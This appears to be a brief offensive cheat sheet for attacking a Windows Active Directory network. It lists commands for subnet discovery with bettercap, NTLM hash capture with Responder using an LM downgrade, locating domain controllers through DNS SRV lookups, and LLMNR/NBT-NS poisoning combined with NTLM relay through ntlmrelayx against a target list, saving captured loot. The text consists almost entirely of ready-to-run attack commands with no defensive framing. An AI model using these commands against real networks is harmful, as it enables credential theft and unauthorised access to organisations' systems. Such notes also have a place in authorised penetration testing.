## Find subnet
bettercap

##Capture Hashes
responder --interface "$INTERFACE" --lm --disable-ess

##Find DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

##Poisonning + relay
smb OFF
http off

responder -I "$INTERFACE" -w -rPv --lm --disable-ess -d -D
ntlmrelayx -i -tf targets.txt  --ipv6 -smb2support --lootdir ntlmrelayx_lootdir
